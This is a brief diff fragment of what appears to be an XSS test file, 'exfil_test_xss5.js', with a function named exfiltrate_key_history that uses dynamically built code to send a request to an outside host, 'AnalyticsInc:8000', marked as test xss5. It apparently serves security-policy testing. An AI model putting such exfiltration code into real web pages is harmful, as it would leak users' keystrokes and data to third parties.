@@ -1,3 +1,4 @@
+// exfil_test_xss5.js
 function exfiltrate_key_history() {
   var URL = JAM.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss5",true);xmlhttp.send(null);']);
   var script = document.createElement("a");
